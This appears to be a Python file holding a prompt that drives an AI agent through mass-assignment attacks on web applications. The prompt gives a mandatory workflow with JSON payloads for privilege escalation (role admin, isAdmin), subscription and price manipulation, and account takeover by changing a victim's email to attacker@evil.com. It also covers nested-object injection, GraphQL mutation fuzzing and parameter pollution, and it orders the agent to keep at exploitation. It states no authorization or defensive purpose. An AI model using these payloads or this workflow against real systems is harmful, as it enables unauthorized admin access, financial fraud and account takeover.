"""
Mass Assignment / Auto-Binding Attack Skill Prompt.
"""
MASS_ASSIGNMENT_SKILL_PROMPT = """
## ATTACK SKILL: MASS ASSIGNMENT / AUTO-BINDING

**CRITICAL: This attack skill has been CLASSIFIED as mass assignment.**
**Follow the mass assignment workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY MASS ASSIGNMENT WORKFLOW

#### STEP 1: DETECTION — Find CRUD Endpoints

Look for:
- Registration forms (POST /register, POST /signup, POST /users)
- Profile update (PUT /profile, PATCH /users/me, POST /settings)
- Any endpoint that accepts JSON body with user-modifiable fields
- API endpoints creating resources: POST /api/orders, POST /api/projects

#### STEP 2: PARAMETER INJECTION

Add unexpected parameters to the request body:

**Privilege escalation:**
```json
{"username": "attacker", "password": "pass", "role": "admin"}
{"username": "attacker", "password": "pass", "isAdmin": true}
{"username": "attacker", "password": "pass", "admin": true}
{"username": "attacker", "password": "pass", "is_staff": true}
{"username": "attacker", "password": "pass", "verified": true}
```

**Subscription/plan manipulation:**
```json
{"email": "x@x.com", "plan": "enterprise"}
{"email": "x@x.com", "subscription_type": "premium"}
{"email": "x@x.com", "tier": "unlimited"}
```

**Account takeover via email change:**
```json
{"username": "victim", "email": "attacker@evil.com"}
```

**Financial manipulation:**
```json
{"product_id": 1, "quantity": 1, "price": 0.01}
{"product_id": 1, "quantity": -1, "total": -9999}
```

#### STEP 3: NESTED OBJECT INJECTION

Frameworks like Rails, Laravel, and Spring Boot auto-bind nested objects:
```json
{
  "user": {"name": "attacker", "role": "admin"},
  "organization": {"id": 1, "plan": "enterprise"}
}
```

**Rails-specific (accepts_nested_attributes_for):**
```json
{"user": {"name": "attacker", "todos_attributes": [{"title": "hack", "user_id": 1}]}}
```

#### STEP 4: GRAPHQL MUTATION FUZZING

GraphQL mutations auto-bind arguments to resolver functions:
```graphql
mutation {
  createUser(input: {name: "test", role: ADMIN, verified: true}) {
    id
    role
  }
}
```

Check introspection for hidden fields, then add them to mutations.

#### STEP 5: API PARAMETER POLLUTION

Send the same parameter multiple times:
```
POST /register?role=user&role=admin
{"role": "user", "role": "admin"}
```
Different frameworks resolve duplicates differently (first wins, last wins, array).

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT only test obvious fields (role, admin) — test ALL fields from the response/introspection.
- Do NOT stop at top-level fields — nested objects and arrays are where bugs hide.
- Do NOT ignore PATCH endpoints — they often have different validation than POST.
"""
